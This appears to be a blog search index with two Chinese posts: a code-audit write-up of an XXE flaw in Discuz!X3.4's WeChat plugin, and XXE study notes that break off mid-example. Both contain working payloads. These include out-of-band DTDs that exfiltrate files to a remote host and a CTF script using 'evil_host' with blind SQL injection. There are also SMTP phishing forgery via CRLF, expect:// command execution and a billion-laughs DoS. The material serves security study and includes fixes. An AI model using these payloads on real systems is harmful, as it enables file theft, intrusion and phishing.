<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Discuz!X3.4前台XXE漏洞</title>
      <link href="/1944236470.html"/>
      <url>/1944236470.html</url>
      
        <content type="html"><![CDATA[<h2 id="0x01前言"><a href="#0x01前言" class="headerlink" title="0x01前言"></a>0x01前言</h2><p>比较幸运，刚学完XXE漏洞，转身给我爆了一个XXE。不过有php版本限制</p><h2 id="0x02漏洞环境"><a href="#0x02漏洞环境" class="headerlink" title="0x02漏洞环境"></a>0x02漏洞环境</h2><p>Discuz!X3.4最新版<br>php5.4.45</p><h2 id="0x03影响范围"><a href="#0x03影响范围" class="headerlink" title="0x03影响范围"></a>0x03影响范围</h2><p>漏洞点出在dz中的微信接口处，经过测试需要PHP&lt;=5.4.45因为高版本中的<code>simplexml_load_string</code>已经不在默认加载LIBXML_NOENT，合理猜测所有有微信插件的版本都可能存在，因为没找到旧版本就没测试。</p><h2 id="0x04漏洞分析"><a href="#0x04漏洞分析" class="headerlink" title="0x04漏洞分析"></a>0x04漏洞分析</h2><p>漏洞文件：/source/plugin/wechat/wechat.lib.class.php<br><img src="/1944236470/1.png" alt><br>可以发现<code>simplexml_load_string</code>中的<code>$postdata</code>我们可以控制（可以看一下<code>simplexml_load_string</code>新版本和旧版本的区别），而到这只经过了两次<code>_checkSignature</code>，跟进看一下<br><img src="/1944236470/2.png" alt><br>大致就是进行一个token的检验，其中参数可控，而如果我们知道token的值就能进行伪造，看一下token是如何传进来的，发现是在实体化WeChatServer类的时候进行的初始化<br><img src="/1944236470/3.png" alt><br>直接全局搜索<code>WeChatServer</code><br>在文件/source/plugin/mobile/api/4/wechat.php中进行了实体化<br><img src="/1944236470/4.png" alt><br><code>$_G[&#39;wechat&#39;][&#39;setting&#39;][&#39;wechat_token&#39;]</code>就是我们的token，是由<code>$_G[&#39;setting&#39;][&#39;mobilewechat&#39;]</code>反序列化来的，我们调试一下看看mobilewechat的值，先找一下入口文件，位置在<code>/source/plugin/mobile/mobilie.php</code><br><img src="/1944236470/5.png" alt><br>构造url:<code>http://127.0.0.1/source/plugin/mobile/mobile.php?module=wechat</code><br><img src="/1944236470/6.png" alt><br>可以发现默认的mobilewechat是null，而这样的话token也是null，<br><img src="/1944236470/7.png" alt><br>直接跟进到<code>_checkSignature</code>函数，看<code>$tmpStr</code>的值<br><img src="/1944236470/8.png" alt><br>可以看到<code>$tmpStr</code>的值就是一个3个空值数组的sha1值，此时<code>$tmpStr</code>可知，可直接通过<code>$signatur</code>传值绕过。至此，我们就可以通过<code>$postdata</code>穿payload进行XXE。我们在回头看一下wexin_token的值是怎么产生的<br>文件位置<code>source\plugin\wechat\install\checkupdate.inc.php</code><br><img src="/1944236470/9.png" alt><br>回溯发现，wechat_token是随机产生的一个16位字符，不可控。<br><img src="/1944236470/10.png" alt><br>这里也可以知道为什么token为null了，只有在安装了微信插件的时候才会生成token，而默认配置则是空，这就能直接前台xxe了<br><img src="/1944236470/11.jpg" alt><br>再继续看，既然token不可控，在看是否能获取。发现，在后台微信设置处能进行设置，但这就要后台权限了。懒得上图了……<br>总结：攻击思路两条，1.默认配置–》token=null–》xxe      2.开启微信插件–》后台–》获取token–&gt;xxe</p><h2 id="0x05漏洞复现"><a href="#0x05漏洞复现" class="headerlink" title="0x05漏洞复现"></a>0x05漏洞复现</h2><p>不多bb，无回显的xxe，需要oob。<br>url=<code>http://www.123.com/source/plugin/mobile/mobile.php?module=wechat&amp;signature=da39a3ee5e6b4b0d3255bfef95601890afd80709</code></p><p>然后post：</p><pre><code>&lt;!DOCTYPE convert [ &lt;!ENTITY % remote SYSTEM &quot;http://ip/test.dtd&quot;&gt;%remote;%int;%send;]&gt;</code></pre><p>test.dtd：</p><pre><code>&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///C:/test.txt&quot;&gt;&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#39;http://ip:10888?p=%file;&#39;&gt;&quot;&gt;</code></pre><p>可以看到vps上成功拿到了test.txt的base64后的数据<br><img src="/1944236470/11.png" alt></p><h2 id="0x06漏洞修复"><a href="#0x06漏洞修复" class="headerlink" title="0x06漏洞修复"></a>0x06漏洞修复</h2><ol><li>禁用外部实体<br><code>libxml_disable_entity_loader(true);</code></li><li>黑名单过滤<br>对一下字符进行过滤<br><code>&lt;!DOCTYPE、&lt;!ENTITY、SYSTEM、PUBLIC</code></li></ol><hr><p>版权声明：</p><p>除非注明，本博文章均为原创，转载请以链接形式标明本文地址。</p><hr>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Discuz </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XXE漏洞学习笔记</title>
      <link href="/3842592324.html"/>
      <url>/3842592324.html</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>今天代码审计，看到一个类似有xxe漏洞的点，但是对这个漏洞不熟悉，就整理学习一下。</p><h2 id="0x02-XXE漏洞介绍"><a href="#0x02-XXE漏洞介绍" class="headerlink" title="0x02 XXE漏洞介绍"></a>0x02 XXE漏洞介绍</h2><p>XXE（XML外部实体注入，XML External Entity) ，在应用程序<strong>解析</strong>XML输入时，当<strong>允许引用外部实体</strong>时，可构造恶意内容，导致读取任意文件、探测内网端口、攻击内网网站、发起DoS拒绝服务攻击、执行系统命令等。</p><p>通过上面的简介xxe漏洞的关键点（是否可以解析并能加载外部实体）和危害一目了然</p><h2 id="0x03-前置知识"><a href="#0x03-前置知识" class="headerlink" title="0x03 前置知识"></a>0x03 前置知识</h2><p>XXE漏洞是基于XML，首先我们就要对XML有所了解</p><h3 id="3-1什么是XML？"><a href="#3-1什么是XML？" class="headerlink" title="3.1什么是XML？"></a>3.1什么是XML？</h3><p>较为官方的描述：</p><ul><li>XML 指可扩展标记语言（EXtensible Markup Language）。</li><li>XML 是一种很像HTML的标记语言。</li><li>XML 的设计宗旨是传输数据，而不是显示数据。</li><li>XML 标签没有被预定义。您需要自行定义标签。</li><li>XML 被设计为具有自我描述性。</li><li>XML 是 W3C 的推荐标准。</li></ul><p>说实话，看这个没咋看懂，我的理解是XML应该是一种数据格式，用来说明数据，容易让人理解，有点类似于json</p><h3 id="3-2XML用来做什么？"><a href="#3-2XML用来做什么？" class="headerlink" title="3.2XML用来做什么？"></a>3.2XML用来做什么？</h3><p>感觉XML作用类似于JSON，不过当时json还没发育，同时XML也是一种可扩展的html。目前应该主要用来存储和交换数据，同时也用于一些配置文件。以上的一切都基于XML跨平台进行数据交互方便</p><h3 id="3-3XML文档结构和语法"><a href="#3-3XML文档结构和语法" class="headerlink" title="3.3XML文档结构和语法"></a>3.3XML文档结构和语法</h3><p>语法:</p><ol><li>XML元素都必须有关闭标签。</li><li>XML 标签对大小写敏感。</li><li>XML 必须正确地嵌套。</li><li>XML 文档必须有根元素。</li><li>XML 的属性值须加引号。</li></ol><p>结构:</p><ol><li>XML 文档声明，在文档的第一行</li><li>XML 文档类型定义，即DTD，XXE 漏洞所在的地方</li><li>XML 文档元素</li></ol><h3 id="3-4DTD"><a href="#3-4DTD" class="headerlink" title="3.4DTD"></a>3.4DTD</h3><p>DTD（文档类型定义，Document Type Definition）的作用是定义 XML 文档的合法构建模块。它使用一系列的合法元素来定义文档结构。可以嵌入在XML文档中(内部声明)，也可以独立的放在一个文件中(外部引用)。</p><h4 id="3-4-1DTD文档组成"><a href="#3-4-1DTD文档组成" class="headerlink" title="3.4.1DTD文档组成"></a>3.4.1DTD文档组成</h4><p>一个DTD文档包含:</p><ol><li>元素（ELEMENT）的定义规则；</li><li>元素之间的关系规则；</li><li>属性（ATTLIST）的定义规则；</li><li>可使用的实体（ENTITY）或符号（NOTATION）规则。<br>```xml<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE poem [                            <--根元素的名称 <!ELEMENT poem (author, title, content)>   &lt;—-子元素的名称及顺序 <!ELEMENT author (#PCDATA)>   &lt;—–子元素的数据类 <!ELEMENT title (#PCDATA)> <!ELEMENT content (#PCDATA)>]&gt;                              &lt;—结束标签<br>&lt;!–为元素poem定义了三个子元素author title content，<br>这三个元素必须要出现并且必须按照这个顺序<br>少元素不行，多元素也不行</li></ol><p>–&gt;</p><!--以此为分界,上面为DTO文档,下面是XML文档--><!--指明author,title,content里面的内容是字符串类型--><poem>    <author>王维</author>    <title>鹿柴</title>    <content>空山不见人，但闻人语声。返景入深林，复照青苔上。</content></poem>```<h4 id="3-4-2DTD元素"><a href="#3-4-2DTD元素" class="headerlink" title="3.4.2DTD元素"></a>3.4.2DTD元素</h4><p>元素声明方法:<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191112151211-bf0da054-051b-1.png" alt></p><h5 id="3-4-2-1-PCDATA"><a href="#3-4-2-1-PCDATA" class="headerlink" title="3.4.2.1 PCDATA"></a>3.4.2.1 PCDATA</h5><p>PCDATA 的意思是被解析的字符数据（parsed character data）。可把字符数据想象为 XML 元素的开始标签与结束标签之间的文本。PCDATA 是会被解析器解析的文本。这些文本将被解析器检查实体以及标记。文本中的标签会被当作标记来处理，而实体会被展开。不过，被解析的字符数据不应当包含任何 &amp; &lt; &gt; 字符；需要使用 &amp; &lt; &gt; 实体来分别替换它们。</p><h5 id="3-4-2-2-CDATA"><a href="#3-4-2-2-CDATA" class="headerlink" title="3.4.2.2 CDATA"></a>3.4.2.2 CDATA</h5><p>CDATA 的意思是字符数据（character data）。CDATA 是不会被解析器解析的文本。在这些文本中的标签不会被当作标记来对待，其中的实体也不会被展开。</p><h5 id="3-4-2-3-实体引用字符"><a href="#3-4-2-3-实体引用字符" class="headerlink" title="3.4.2.3 实体引用字符"></a>3.4.2.3 实体引用字符</h5><p><img src="https://upload-images.jianshu.io/upload_images/9113969-6d646ba873e1445a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p><h5 id="3-4-2-4-CDATA和PCDATA区别"><a href="#3-4-2-4-CDATA和PCDATA区别" class="headerlink" title="3.4.2.4 CDATA和PCDATA区别"></a>3.4.2.4 CDATA和PCDATA区别</h5><p>按照我的理解就是PCDATA会解析所有字符,如果冲突就会报错,而CDATA则不解析仍和字符.</p><h4 id="3-4-3DTD引用方式"><a href="#3-4-3DTD引用方式" class="headerlink" title="3.4.3DTD引用方式:"></a>3.4.3DTD引用方式:</h4><ul><li>DTD内部声明<br><code>&lt;!DOCTYPE 根元素 [元素声明]&gt;</code></li><li>DTD外部引用<br><code>&lt;!DOCTYPE 根元素名称 SYSTEM “外部DTD的URI”&gt;</code></li><li>引用公共DTD<br><code>&lt;!DOCTYPE 根元素名称 PUBLIC “DTD标识名” “公用DTD的URI”&gt;</code></li></ul><h3 id="3-5-实体"><a href="#3-5-实体" class="headerlink" title="3.5 实体"></a>3.5 实体</h3><p>实体可以理解成变量,给一段代码或数据起一个名字,方便在别的地方引用.<br>大致分为两类:</p><ol><li>一般实体(格式：&amp;实体引用名;)</li><li>参数实体(格式：%实体引用名;)</li></ol><p>其次还有内外之分,外部实体表示外部文件的内容,用 SYSTEM 关键词表示.而造成XXE的一般就是外部实体</p><h5 id="3-5-1-一般实体"><a href="#3-5-1-一般实体" class="headerlink" title="3.5.1 一般实体"></a>3.5.1 一般实体</h5><ol><li><p>一般内部实体<br>格式:<code>&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt;</code><br>举例:以下就声明了x,y两个内部实体</p><pre class=" language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="utf-8"?></span><span class="token doctype">&lt;!DOCTYPE root [ &lt;!ENTITY x "Hello"></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">y</span> <span class="token attr-name">"World!"</span><span class="token punctuation">></span></span>]><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>root</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>x</span><span class="token punctuation">></span></span><span class="token entity" title="&x;">&amp;x;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>x</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>y</span><span class="token punctuation">></span></span><span class="token entity" title="&y;">&amp;y;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>y</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>root</span><span class="token punctuation">></span></span></code></pre></li><li><p>一般外部实体<br>外部实体表示外部文件的内容<br>格式:<code>&lt;!ENTITY 实体名称 SYSTEM &quot;URI&quot;&gt;</code><br>举例:</p><pre class=" language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="utf-8"?></span><span class="token doctype">&lt;!DOCTYPE root [&lt;!ENTITY  file SYSTEM "file:///etc/passwd"></span>]><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>root</span><span class="token punctuation">></span></span><span class="token entity" title="&file;">&amp;file;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>root</span><span class="token punctuation">></span></span></code></pre><h5 id="3-5-2-参数实体"><a href="#3-5-2-参数实体" class="headerlink" title="3.5.2 参数实体"></a>3.5.2 参数实体</h5><p>参数实体使用<code>% 实体名(这里面空格不能少)</code>在 DTD 中定义，并且只能在 DTD 中使用<code>%实体名;</code>引用</p></li><li><p>内部参数实体<br>格式:<code>&lt;!ENTITY % 实体名称 &quot;实体的值&quot;&gt;</code></p><pre class=" language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="utf-8"?></span><span class="token doctype">&lt;!DOCTYPE a [ &lt;!ENTITY % name "test"></span> %name;]></code></pre></li><li><p>外部参数实体<br>格式:<code>&lt;!ENTITY % 实体名称 SYSTEM &quot;URI&quot;&gt;</code><br>举例:</p><pre class=" language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="utf-8"?></span><span class="token doctype">&lt;!DOCTYPE a [ &lt;!ENTITY % name SYSTEM "file:///etc/passwd"></span> %name;]></code></pre><h5 id="3-5-3外部实体支持的协议"><a href="#3-5-3外部实体支持的协议" class="headerlink" title="3.5.3外部实体支持的协议"></a>3.5.3外部实体支持的协议</h5><p>更多协议的引入这就提供了更多操作空间<br><img src="https://thief.one/upload_image/20170620/1.png" alt></p></li></ol><h2 id="0x04-XXE攻击方式"><a href="#0x04-XXE攻击方式" class="headerlink" title="0x04 XXE攻击方式"></a>0x04 XXE攻击方式</h2><p>基本的前置知识就上面这些,其实通过后面的实体,攻击的思路基本就出来了,就是利用外部实体来进行攻击,具体看下面(php&gt;=5.38的版本当中,需要声明LIBXML_NOENT,高版本的php不在默认解析实体)<br>LIBXML_NOENT的官方含义过于简短,大概就是允许替换外部或非外部的XML字符实体引用,踩得坑记一下.</p><h3 id="4-1有回显的文件读取"><a href="#4-1有回显的文件读取" class="headerlink" title="4.1有回显的文件读取"></a>4.1有回显的文件读取</h3><p>实例代码:</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">libxml_disable_entity_loader</span> <span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$xmlfile</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span>'php<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//input');</span><span class="token variable">$dom</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DOMDocument</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$dom</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">loadXML</span><span class="token punctuation">(</span><span class="token variable">$xmlfile</span><span class="token punctuation">,</span> <span class="token constant">LIBXML_NOENT</span> <span class="token operator">|</span> <span class="token constant">LIBXML_DTDLOAD</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$creds</span> <span class="token operator">=</span> <span class="token function">simplexml_import_dom</span><span class="token punctuation">(</span><span class="token variable">$dom</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$creds</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p>payload:</p><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE creds [  &lt;!ENTITY goodies SYSTEM &quot;file:///c:/test.txt&quot;&gt; ]&gt; &lt;creds&gt;&amp;goodies;&lt;/creds&gt;</code></pre><p>可以看到成功读取<br><img src="https://raw.githubusercontent.com/j0k3r-z/images/master/img/20200328024529.png" alt></p><h3 id="4-2无回显的文件读取"><a href="#4-2无回显的文件读取" class="headerlink" title="4.2无回显的文件读取"></a>4.2无回显的文件读取</h3><p>正常环境当中很少会有回显,而面对没有回显的情况,我们要如何去获得读取的内容?<br>首先想到的是把数据外带出来,如何外带,首先就是实体,其本身就是一个请求,而如果我们请求的同时带上我们的数据,就可在vps中获取,这就要两次请求,一次请求来获取我们的数据,另一次请求来传送我们的数据到vps,这就要用到参数实体来进行实体引用.</p><p>测试代码:</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">libxml_disable_entity_loader</span> <span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$xmlfile</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span>'php<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//input');</span><span class="token variable">$dom</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DOMDocument</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$dom</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">loadXML</span><span class="token punctuation">(</span><span class="token variable">$xmlfile</span><span class="token punctuation">,</span> <span class="token constant">LIBXML_NOENT</span> <span class="token operator">|</span> <span class="token constant">LIBXML_DTDLOAD</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p>test.dtd</p><pre><code>&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///C:/test.txt&quot;&gt;&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#39;http://ip:10888?p=%file;&#39;&gt;&quot;&gt;</code></pre><p>%要进行HTML编码,因为实体当中不能有%(具体参考上面),文件进行base64也是也是同理<br>payload</p><pre><code>&lt;!DOCTYPE convert [ &lt;!ENTITY % remote SYSTEM &quot;http://ip/test.dtd&quot;&gt;%remote;%int;%send;]&gt;</code></pre><p>成功获取数据:<br><img src="/3842592324/1.png" alt></p><p>调用过程:<br>首先要知道XML中的实体调用的规律,先调用DTD中的在调用XML中的,切严格按照先后顺序,存在内部直接调用实体就先执行(个人总结),这样看就很清楚,首先调用remote,去加载vps上的test.dtd然后调用里面的int实体化send,继续,sent直接调用了file,调用完之后回头payload中的顺序,在调用send将其发送到我们的vps上</p><p>其实还有一种是基于错误的XXE,就不演示了</p><h3 id="4-3-内网探测"><a href="#4-3-内网探测" class="headerlink" title="4.3 内网探测"></a>4.3 内网探测</h3><p>可以看到xml的URI其实支持很多协议,这就让我们的攻击面进行了扩大,姿势变得更多,尤其是java,可支持gophar这个万能协议,这里稍微演示一下,了解就好</p><p>内网探测很简单,利用协议发包看有没有回显就好,有的师傅已经写成脚本了<br>我这里主要就写个demo测试下</p><pre class=" language-xml"><code class="language-xml"><span class="token doctype">&lt;!DOCTYPE convert [ &lt;!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=http://ip/"></span>]><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>test</span><span class="token punctuation">></span></span><span class="token entity" title="&xxe;">&amp;xxe;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>test</span><span class="token punctuation">></span></span></code></pre><p>端口的话可以这样:</p><pre class=" language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="utf-8"?></span>  <span class="token doctype">&lt;!DOCTYPE data SYSTEM "http://127.0.0.1:XX/" [  &lt;!ELEMENT data (#PCDATA)></span>  ]><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>data</span><span class="token punctuation">></span></span>4<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>data</span><span class="token punctuation">></span></span></code></pre><p><img src="/3842592324/2.png" alt><br>其实都可以用来两者是一样的,也可换过来用,当然,测试的场景很简单,更多的是提供个思路,真实环境中的利用还需要多思考.</p><h3 id="4-4-内网盲注"><a href="#4-4-内网盲注" class="headerlink" title="4.4 内网盲注"></a>4.4 内网盲注</h3><p>是强网杯的题目,脚本附一下</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">'http://39.107.33.75:33899/common.php'</span>s <span class="token operator">=</span> requests<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span>result <span class="token operator">=</span> <span class="token string">''</span>data <span class="token operator">=</span> <span class="token punctuation">{</span>        <span class="token string">"name"</span><span class="token punctuation">:</span><span class="token string">"evil_man"</span><span class="token punctuation">,</span>        <span class="token string">"email"</span><span class="token punctuation">:</span><span class="token string">"testabcdefg@gmail.com"</span><span class="token punctuation">,</span>        <span class="token string">"comment"</span><span class="token punctuation">:</span><span class="token triple-quoted-string string">"""&lt;?xml version="1.0" encoding="utf-8"?>                &lt;!DOCTYPE root [                &lt;!ENTITY % dtd SYSTEM "http://evil_host/evil.dtd">                %dtd;]>                """</span><span class="token punctuation">}</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">28</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> j <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">48</span><span class="token punctuation">,</span><span class="token number">123</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                f <span class="token operator">=</span> open<span class="token punctuation">(</span><span class="token string">'./evil.dtd'</span><span class="token punctuation">,</span><span class="token string">'w'</span><span class="token punctuation">)</span>            payload2 <span class="token operator">=</span> <span class="token triple-quoted-string string">"""&lt;!ENTITY % file SYSTEM "php://filter/read=zlib.deflate/convert.base64-encode/resource=http://192.168.223.18/test.php?shop=3'-(case%a0when((select%a0group_concat(total)%a0from%a0albert_shop)like%a0binary('{}'))then(0)else(1)end)-'1">                &lt;!ENTITY % all "&lt;!ENTITY % send SYSTEM 'http://evil_host/?result=%file;'>">                %all;                %send;"""</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span><span class="token string">'_'</span><span class="token operator">*</span>i<span class="token operator">+</span>chr<span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'_'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">27</span><span class="token operator">-</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>                f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span>                f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>                <span class="token keyword">print</span> <span class="token string">'test {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>chr<span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">)</span>                r <span class="token operator">=</span> s<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span>                <span class="token keyword">if</span> <span class="token string">"Oti3a3LeLPdkPkqKF84xs="</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>content <span class="token operator">and</span> chr<span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token operator">!=</span><span class="token string">'_'</span><span class="token punctuation">:</span>                        result <span class="token operator">+=</span> chr<span class="token punctuation">(</span>j<span class="token punctuation">)</span>                        <span class="token keyword">print</span> chr<span class="token punctuation">(</span>j<span class="token punctuation">)</span>                        <span class="token keyword">break</span><span class="token keyword">print</span> result</code></pre><h3 id="4-5文件上传"><a href="#4-5文件上传" class="headerlink" title="4.5文件上传"></a>4.5文件上传</h3><p>这其实是k0rz3n师傅出的一道题目里面的思路<a href="https://www.k0rz3n.com/2018/11/19/LCTF%202018%20T4lk%201s%20ch34p,sh0w%20m3%20the%20sh31l%20%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/#0X01-%E8%AF%B4%E4%B8%80%E4%B8%8B%E6%83%B3%E8%A6%81%E8%80%83%E5%AF%9F%E7%9A%84%E7%82%B9" target="_blank" rel="noopener">LCTF 2018 T4lk 1s ch34p,sh0w m3 the sh31l 详细分析</a><br>这里主要提一下jar://协议<br>jar://协议</p><pre><code>jar:{url}!{path}</code></pre><p>使用:</p><pre><code>jar:http://host/application.jar!/file/within/the/zip</code></pre><p>和php中的phar类似,但是phar://不能加载远程文件<br>jar 协议处理文件的过程：</p><ol><li>下载 jar/zip 文件到临时文件中</li><li>提取出我们指定的文件</li><li>删除临时文件</li></ol><p>有点类似于条件竞争,需要考虑如何获取文件的路径,以及如何延长存在的时间,还需要一个包含来利用</p><h3 id="4-6邮件伪造"><a href="#4-6邮件伪造" class="headerlink" title="4.6邮件伪造"></a>4.6邮件伪造</h3><p>若是内网存在一台易受攻击的SMTP服务器,就能利用ftp://协议结合CRLF注入向其发送任意命令,可以由此可以进行邮件伪造,造成钓鱼<br>原理:</p><blockquote><p>Java支持在sun.net.ftp.impl.FtpClient中的ftp URI。因此，我们可以指定用户名和密码，例如ftp://user:password@host:port/XXX.txt，FTP客户端将在连接中发送相应的USER命令。<br>但是如果我们将%0D%0A (CRLF)添加到URL的user部分的任意位置，我们就可以终止USER命令并向FTP会话中注入一个新的命令，即允许我们向25端口发送任意的SMTP命令：</p></blockquote><p>demo:</p><pre><code>ftp://aEHLO aMAIL FROM: &lt;support@VULNERABLESYSTEM.com&gt;RCPT TO: &lt;victim@gmail.com&gt;DATAFrom: support@VULNERABLESYSTEM.comTo: victim@gmail.comSubject: Reset your passwordWe need to confirm your identity. Confirm your password here: http://PHISHING_URL.com.QUIT:support@VULNERABLESYSTEM.com:25</code></pre><h3 id="4-7-php-expect-RCE"><a href="#4-7-php-expect-RCE" class="headerlink" title="4.7 php expect RCE"></a>4.7 php expect RCE</h3><p>需要expect扩展<br>demo:</p><pre class=" language-xml"><code class="language-xml"><span class="token doctype">&lt;!DOCTYPE root[&lt;!ENTITY cmd SYSTEM "expect://id"></span>]><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dir</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>file</span><span class="token punctuation">></span></span><span class="token entity" title="&cmd;">&amp;cmd;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>file</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dir</span><span class="token punctuation">></span></span></code></pre><h3 id="4-8-DOS"><a href="#4-8-DOS" class="headerlink" title="4.8 DOS"></a>4.8 DOS</h3><p>demo:</p><pre class=" language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0"?></span>     <span class="token doctype">&lt;!DOCTYPE lolz [     &lt;!ENTITY lol "lol"></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">lol2</span> <span class="token attr-name">"&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;"</span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">lol3</span> <span class="token attr-name">"&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;"</span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">lol4</span> <span class="token attr-name">"&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;"</span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">lol5</span> <span class="token attr-name">"&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;"</span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">lol6</span> <span class="token attr-name">"&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;"</span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">lol7</span> <span class="token attr-name">"&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;"</span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">lol8</span> <span class="token 